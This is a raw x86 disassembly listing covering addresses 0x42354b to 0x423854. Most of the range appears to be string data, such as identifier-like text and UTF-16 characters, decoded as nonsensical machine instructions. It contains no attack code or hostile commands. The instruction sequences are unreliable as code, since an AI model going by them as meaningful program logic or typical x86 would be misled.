  42354b:	push   ebp
  42354c:	cmp    DWORD PTR [eax],eax
  42354e:	push   edi
  42354f:	push   ebp
  423550:	inc    ecx
  423551:	xor    dh,BYTE PTR [ebx]
  423553:	xor    ebx,DWORD PTR [edi+0x4e]
  423556:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42355a:	cmp    DWORD PTR [edi+0x38],ebx
  42355d:	dec    ecx
  42355e:	cmp    DWORD PTR [edx+0x36],ebx
  423561:	pop    edi
  423562:	dec    edx
  423563:	xor    BYTE PTR [edx+0x34],cl
  423566:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42356a:	xor    esi,DWORD PTR [eax]
  42356c:	pop    edi
  42356d:	inc    edx
  42356e:	dec    ebx
  42356f:	pop    eax
  423570:	pop    eax
  423571:	xor    eax,0x51414d00
  423576:	pop    edi
  423577:	inc    ecx
  423578:	xor    al,BYTE PTR [ebp+0x5f]
  42357b:	inc    ecx
  42357c:	dec    ebx
  42357d:	cmp    DWORD PTR ds:0x5a003939,esi
  423583:	inc    ebp
  423584:	cmp    BYTE PTR [edi+0x4d],bl
  423587:	ss dec eax
  423589:	dec    ebx
  42358a:	add    BYTE PTR [ebp+0x57],al
  42358d:	xor    DWORD PTR [edi+0x31],ebx
  423590:	dec    ebx
  423591:	xor    eax,DWORD PTR [ecx+0x30]
  423594:	push   ebx
  423595:	add    BYTE PTR [edx+esi*1+0x36],al
  423599:	aaa    
  42359a:	pop    edi
  42359b:	push   edx
  42359c:	dec    eax
  42359d:	dec    ebp
  42359e:	cmp    BYTE PTR [edi+0x37],bl
  4235a1:	inc    esi
  4235a2:	xor    eax,0x43355500
  4235a7:	pop    edi
  4235a8:	pop    ecx
  4235a9:	dec    ecx
  4235aa:	push   ebx
  4235ab:	xor    bl,BYTE PTR [edi+0x52]
  4235ae:	add    BYTE PTR [eax+0x55],dl
  4235b1:	dec    ecx
  4235b2:	xor    BYTE PTR [edi+0x43],bl
  4235b5:	ss inc ebp
  4235b7:	xor    bl,BYTE PTR [edi+0x4d]
  4235ba:	xor    al,0x4a
  4235bc:	push   edx
  4235bd:	push   ebp
  4235be:	add    BYTE PTR [esi+0x39],cl
  4235c1:	push   eax
  4235c2:	pop    edi
  4235c3:	push   ebp
  4235c4:	cmp    DWORD PTR [esi],esi
  4235c6:	xor    BYTE PTR [ecx],dh
  4235c8:	pop    edi
  4235c9:	dec    edi
  4235ca:	dec    esi
  4235cb:	push   esp
  4235cc:	cmp    BYTE PTR [eax],al
  4235ce:	dec    esp
  4235cf:	xor    al,0x44
  4235d1:	xor    DWORD PTR [edi+0x4b],ebx
  4235d4:	xor    DWORD PTR [ebp+0x5f],eax
  4235d7:	pop    edx
  4235d8:	add    BYTE PTR [edi+esi*1+0x43],dl
  4235dc:	pop    edi
  4235dd:	inc    edx
  4235de:	xor    dh,BYTE PTR [ecx]
  4235e0:	push   ebx
  4235e1:	xor    DWORD PTR [ecx],edi
  4235e3:	inc    edx
  4235e4:	add    BYTE PTR [edi+0x45],al
  4235e7:	xor    al,0x38
  4235e9:	xor    BYTE PTR [eax],dh
  4235eb:	pop    edi
  4235ec:	dec    edx
  4235ed:	dec    ebx
  4235ee:	xor    eax,0x33345f4d
  4235f3:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4235f7:	pop    edi
  4235f8:	aaa    
  4235f9:	push   esi
  4235fa:	dec    ebx
  4235fb:	push   edx
  4235fc:	pop    edi
  4235fd:	inc    ebx
  4235fe:	add    BYTE PTR [edx+0x35],bl
  423601:	dec    ebp
  423602:	pop    edi
  423603:	inc    edi
  423604:	dec    esi
  423605:	xor    al,0x49
  423607:	xor    eax,0x54590035
  42360c:	push   edx
  42360d:	pop    edi
  42360e:	push   esp
  42360f:	inc    ebx
  423610:	inc    ecx
  423611:	pop    edi
  423612:	cmp    DWORD PTR [ecx+0x41],ebx
  423615:	push   ebp
  423616:	pop    edi
  423617:	push   ebp
  423618:	inc    ebp
  423619:	add    BYTE PTR [esi+esi*1+0x35],cl
  42361d:	pop    edi
  42361e:	pop    eax
  42361f:	dec    edx
  423620:	inc    edx
  423621:	inc    edi
  423622:	add    BYTE PTR [edx+0x36],al
  423625:	inc    ebx
  423626:	pop    edi
  423627:	xor    BYTE PTR ds:0x36464b,dh
  42362d:	dec    ebx
  42362e:	cmp    DWORD PTR [esi+0x37],eax
  423631:	xor    ebx,DWORD PTR [edi+0x35]
  423634:	ss inc edi
  423636:	pop    ecx
  423637:	dec    eax
  423638:	pop    ecx
  423639:	add    BYTE PTR [ebp+0x35],cl
  42363c:	push   eax
  42363d:	xor    BYTE PTR [edi+0x4f],bl
  423640:	pop    ecx
  423641:	xor    cl,BYTE PTR [edi+0x0]
  423644:	pop    ecx
  423645:	xor    DWORD PTR [esi+0x5f],ecx
  423648:	xor    al,BYTE PTR [edx+0x30]
  42364b:	push   esi
  42364c:	push   esp
  42364d:	inc    ebp
  42364e:	add    BYTE PTR [edi+0x37],al
  423651:	push   esi
  423652:	xor    DWORD PTR [edi+0x49],ebx
  423655:	xor    al,BYTE PTR [esi+0x30]
  423658:	pop    edi
  423659:	ss dec esi
  42365b:	cmp    BYTE PTR [eax],al
  42365d:	pop    edx
  42365e:	xor    eax,0x445f334b
  423663:	xor    BYTE PTR [eax],bh
  423665:	push   ecx
  423666:	push   esi
  423667:	xor    al,0x0
  423669:	push   ebp
  42366a:	pop    eax
  42366b:	inc    edi
  42366c:	xor    DWORD PTR [edi+0x39],ebx
  42366f:	push   esp
  423670:	inc    ebx
  423671:	aaa    
  423672:	inc    esp
  423673:	add    BYTE PTR [edi+0x39],dl
  423676:	ss pop edi
  423678:	dec    eax
  423679:	pop    edx
  42367a:	pop    ecx
  42367b:	inc    edi
  42367c:	push   ebp
  42367d:	pop    edi
  42367e:	push   eax
  42367f:	dec    eax
  423680:	inc    ebx
  423681:	add    BYTE PTR [ebp+0x0],dl
  423684:	xor    al,0x0
  423686:	dec    edi
  423687:	add    BYTE PTR [edi+0x0],bl
  42368a:	cmp    BYTE PTR [eax],al
  42368c:	xor    al,BYTE PTR [eax]
  42368e:	inc    ebx
  42368f:	add    BYTE PTR [edx+0x0],bl
  423692:	inc    ebx
  423693:	add    BYTE PTR [edi],dh
  423695:	add    BYTE PTR [edi+0x0],bl
  423698:	inc    ebx
  423699:	add    BYTE PTR [eax+eax*1+0x0],al
  42369d:	add    BYTE PTR [eax+eax*1+0x4b],cl
  4236a1:	add    BYTE PTR [edx],dh
  4236a3:	add    BYTE PTR [edi+0x0],bl
  4236a6:	cmp    BYTE PTR [eax],al
  4236a8:	dec    esp
  4236a9:	add    BYTE PTR [esi+0x0],dl
  4236ac:	pop    edi
  4236ad:	add    BYTE PTR [ecx+0x0],bl
  4236b0:	push   edx
  4236b1:	add    BYTE PTR [esi+0x0],dl
  4236b4:	xor    al,BYTE PTR [eax]
  4236b6:	cmp    BYTE PTR [eax],al
  4236b8:	pop    edi
  4236b9:	add    BYTE PTR [edx+0x0],cl
  4236bc:	add    BYTE PTR [eax],al
  4236be:	inc    edx
  4236bf:	add    BYTE PTR [eax+eax*1+0x46],cl
  4236c3:	add    BYTE PTR [edi+0x0],bl
  4236c6:	xor    eax,DWORD PTR [eax]
  4236c8:	inc    ebp
  4236c9:	add    BYTE PTR [ecx+0x0],cl
  4236cc:	push   edx
  4236cd:	add    BYTE PTR [ecx],bh
  4236cf:	add    BYTE PTR [esi+0x0],dl
  4236d2:	add    BYTE PTR [eax],al
  4236d4:	dec    ebp
  4236d5:	add    BYTE PTR [edi],dh
  4236d7:	add    BYTE PTR [eax+eax*1+0x5f],al
  4236db:	add    BYTE PTR [edx+0x0],cl
  4236de:	pop    eax
  4236df:	add    BYTE PTR [ebx],dh
  4236e1:	add    BYTE PTR [ecx],dh
  4236e3:	add    BYTE PTR [ebx+0x0],al
  4236e6:	add    BYTE PTR [eax],al
  4236e8:	dec    edi
  4236e9:	add    BYTE PTR [esi],dh
  4236eb:	add    BYTE PTR [eax+0x0],cl
  4236ee:	pop    edi
  4236ef:	add    BYTE PTR [eax],dh
  4236f1:	add    BYTE PTR [edi],dh
  4236f3:	add    BYTE PTR [ecx],dh
  4236f5:	add    BYTE PTR [edx+0x0],dl
  4236f8:	xor    eax,0x55000000
  4236fd:	add    BYTE PTR [eax+eax*1+0x5a],dl
  423701:	add    BYTE PTR [edi+0x0],bl
  423704:	push   esp
  423705:	add    BYTE PTR [ecx+0x0],al
  423708:	cmp    DWORD PTR [eax],eax
  42370a:	pop    edi
  42370b:	add    BYTE PTR [ebx],dh
  42370d:	add    BYTE PTR [eax],dh
  42370f:	add    BYTE PTR [eax],bh
  423711:	add    BYTE PTR [edi+0x0],cl
  423714:	inc    ebx
  423715:	add    BYTE PTR ds:0x4d000000,dh
  42371b:	add    BYTE PTR [esi+0x0],cl
  42371e:	inc    ebp
  42371f:	add    BYTE PTR [edi+0x0],bl
  423722:	push   esp
  423723:	add    BYTE PTR [esi+0x0],al
  423726:	cmp    BYTE PTR [eax],al
  423728:	push   ebx
  423729:	add    BYTE PTR [edx+0x0],bl
  42372c:	pop    edi
  42372d:	add    BYTE PTR [eax],dh
  42372f:	add    BYTE PTR [eax],bh
  423731:	add    BYTE PTR [eax+0x0],cl
  423734:	add    BYTE PTR [eax],al
  423736:	dec    esi
  423737:	add    BYTE PTR [edi+0x0],cl
  42373a:	pop    edx
  42373b:	add    BYTE PTR [edi+0x0],bl
  42373e:	add    BYTE PTR ss:[ecx+0x0],bl
  423742:	dec    ebp
  423743:	add    BYTE PTR [esi],dh
  423745:	add    BYTE PTR [ebx],dh
  423747:	add    BYTE PTR [edi+0x0],bl
  42374a:	xor    al,0x0
  42374c:	dec    esi
  42374d:	add    BYTE PTR [edx],dh
  42374f:	add    BYTE PTR [esi],dh
  423751:	add    BYTE PTR [ecx],dh
  423753:	add    BYTE PTR [eax],al
  423755:	add    BYTE PTR [ebx+0x0],cl
  423758:	dec    eax
  423759:	add    BYTE PTR [eax],bh
  42375b:	add    BYTE PTR [edi+0x0],bl
  42375e:	inc    esi
  42375f:	add    BYTE PTR [esi+0x0],al
  423762:	push   esp
  423763:	add    BYTE PTR [edi],dh
  423765:	add    BYTE PTR [esi],dh
  423767:	add    BYTE PTR [edi+0x0],bl
  42376a:	dec    esp
  42376b:	add    BYTE PTR [ecx+0x0],bl
  42376e:	add    BYTE PTR [eax],al
  423770:	push   ebx
  423771:	add    BYTE PTR [ecx+0x0],bl
  423774:	xor    BYTE PTR [eax],al
  423776:	pop    edi
  423777:	add    BYTE PTR [ecx],bh
  423779:	add    BYTE PTR [edx+0x0],dl
  42377c:	dec    eax
  42377d:	add    BYTE PTR [ecx+0x0],bl
  423780:	xor    al,BYTE PTR [eax]
  423782:	pop    edi
  423783:	add    BYTE PTR [eax],dh
  423785:	add    BYTE PTR [eax],al
  423787:	add    BYTE PTR [edx+0x0],al
  42378a:	dec    edx
  42378b:	add    BYTE PTR [esi+0x0],cl
  42378e:	xor    al,BYTE PTR [eax]
  423790:	pop    edi
  423791:	add    BYTE PTR [eax+eax*1+0x33],cl
  423795:	add    BYTE PTR [edx+0x0],dl
  423798:	xor    al,0x0
  42379a:	dec    eax
  42379b:	add    BYTE PTR [eax],al
  42379d:	add    BYTE PTR [ebp+0x0],dl
  4237a0:	add    BYTE PTR ss:[ebp+0x0],cl
  4237a4:	xor    DWORD PTR [eax],eax
  4237a6:	pop    edi
  4237a7:	add    BYTE PTR [esi],dh
  4237a9:	add    BYTE PTR [ecx+0x0],bl
  4237ac:	push   ebp
  4237ad:	add    BYTE PTR [eax+eax*1+0x5f],dl
  4237b1:	add    BYTE PTR [edi+0x0],cl
  4237b4:	inc    esp
  4237b5:	add    BYTE PTR [edi+0x0],dl
  4237b8:	push   ebx
  4237b9:	add    BYTE PTR [eax],al
  4237bb:	add    BYTE PTR [edx+0x0],bl
  4237be:	inc    ebx
  4237bf:	add    BYTE PTR [ebp+0x0],dl
  4237c2:	pop    edi
  4237c3:	add    BYTE PTR [ecx],dh
  4237c5:	add    BYTE PTR [ebp+0x0],al
  4237c8:	push   esp
  4237c9:	add    BYTE PTR [eax],dh
  4237cb:	add    BYTE PTR [eax],al
  4237cd:	add    BYTE PTR [eax],al
  4237cf:	add    BYTE PTR [eax],al
  4237d1:	add    BYTE PTR [eax-0x7ffbffbe],al
  4237d7:	inc    edx
  4237d8:	add    BYTE PTR [eax],cl
  4237da:	add    BYTE PTR [edx+0x0],0xc
  4237de:	add    BYTE PTR [edx+0x0],0x10
  4237e2:	add    BYTE PTR [edx+0x0],0x14
  4237e6:	add    BYTE PTR [edx+0x0],0x18
  4237ea:	add    BYTE PTR [edx+0x0],0x1c
  4237ee:	add    BYTE PTR [edx+0x0],0x20
  4237f2:	add    BYTE PTR [edx+0x0],0x24
  4237f6:	add    BYTE PTR [edx+0x0],0x28
  4237fa:	add    BYTE PTR [edx+0x0],0x0
  4237fe:	add    BYTE PTR [eax],al
  423800:	add    BYTE PTR [eax],al
  423802:	add    BYTE PTR [eax],al
  423804:	xor    ebx,DWORD PTR [edi]
  423806:	ja     0x423855
  423808:	add    BYTE PTR [eax],al
  42380a:	add    BYTE PTR [eax],al
  42380c:	xor    bh,BYTE PTR [eax]
  42380e:	add    al,BYTE PTR [eax]
  423810:	add    DWORD PTR [eax],eax
  423812:	add    BYTE PTR [eax],al
  423814:	add    DWORD PTR [eax],eax
  423816:	add    BYTE PTR [eax],al
  423818:	add    DWORD PTR [eax],eax
  42381a:	add    BYTE PTR [eax],al
  42381c:	sub    BYTE PTR [eax],bh
  42381e:	add    al,BYTE PTR [eax]
  423820:	sub    al,0x38
  423822:	add    al,BYTE PTR [eax]
  423824:	xor    BYTE PTR [eax],bh
  423826:	add    al,BYTE PTR [eax]
  423828:	daa    
  423829:	mov    BYTE PTR [eax],al
  42382b:	add    BYTE PTR [esi],bh
  42382d:	cmp    BYTE PTR [edx],al
  42382f:	add    BYTE PTR [eax],al
  423831:	add    BYTE PTR [edi+0x6f],dl
  423834:	jb     0x42389a
  423836:	push   edi
  423837:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42383e:	aas    
  42383f:	inc    ebp
  423840:	outs   dx,BYTE PTR ds:[esi]
  423841:	jne    0x4238b0
  423843:	push   edi
  423844:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42384b:	popa   
  42384c:	je     0x4238b7
  42384e:	outs   dx,DWORD PTR ds:[esi]
  42384f:	outs   dx,BYTE PTR ds:[esi]
  423850:	jae    0x4238a5
  423852:	je     0x4238b5
  423854:	.byte 0x74
